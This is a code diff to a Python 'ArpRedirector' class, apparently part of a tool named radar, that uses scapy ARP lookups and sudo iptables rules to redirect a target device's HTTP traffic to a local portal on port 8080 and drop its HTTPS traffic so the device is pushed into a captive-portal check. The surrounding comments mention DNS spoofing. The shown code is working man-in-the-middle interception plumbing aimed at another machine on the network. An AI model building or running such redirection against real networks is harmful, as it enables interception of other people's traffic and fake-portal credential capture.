@@ -30,7 +30,7 @@ class ArpRedirector:
 
     def _get_mac(self, ip):
         from scapy.all import srp, Ether
-        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=2, verbose=False)
+        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=4, retry=3, verbose=False, iface=self.interface)
         for _, r in ans:
             return r[Ether].src
         return None
@@ -79,10 +79,10 @@ class ArpRedirector:
         import subprocess
         try:
             # 1. Clear any existing rules for this target to avoid duplicates
-            subprocess.run(["sudo", "iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "-s", self.target_ip, "--dport", "80", "-j", "REDIRECT", "--to-port", "80"], check=False)
+            subprocess.run(["sudo", "iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "-s", self.target_ip, "--dport", "80", "-j", "REDIRECT", "--to-port", "8080"], check=False)
             
             # 2. Force all HTTP traffic to our local portal
-            subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "-s", self.target_ip, "--dport", "80", "-j", "REDIRECT", "--to-port", "80"], check=True)
+            subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "-s", self.target_ip, "--dport", "80", "-j", "REDIRECT", "--to-port", "8080"], check=True)
             
             # 3. DROP HTTPS traffic (Forces the OS to trigger a Captive Portal check)
             # We drop in both FORWARD (for normal routing) and INPUT (for DNS-spoofed local hits)
@@ -116,14 +116,13 @@ class ArpRedirector:
         
         import subprocess
         try:
-            subprocess.run(["sudo", "iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "-s", self.target_ip, "--dport", "80", "-j", "REDIRECT", "--to-port", "80"], check=False)
+            subprocess.run(["sudo", "iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "-s", self.target_ip, "--dport", "80", "-j", "REDIRECT", "--to-port", "8080"], check=False)
             subprocess.run(["sudo", "iptables", "-D", "FORWARD", "-p", "tcp", "-s", self.target_ip, "--dport", "443", "-j", "DROP"], check=False)
             subprocess.run(["sudo", "iptables", "-D", "INPUT", "-p", "tcp", "-s", self.target_ip, "--dport", "443", "-j", "DROP"], check=False)
         except:
             pass
 
         print("✅ Network restored.")
-        sys.exit(0)
 
 def main():
     if len(sys.argv) < 2:
@@ -131,7 +130,9 @@ def main():
         sys.exit(1)
         
     target = sys.argv[1]
-    redirector = ArpRedirector(target)
+    from radar.utils.helpers import get_wifi_interface
+    interface = get_wifi_interface()
+    redirector = ArpRedirector(target, interface=interface)
     
     def signal_handler(sig, frame):
         redirector.stop()
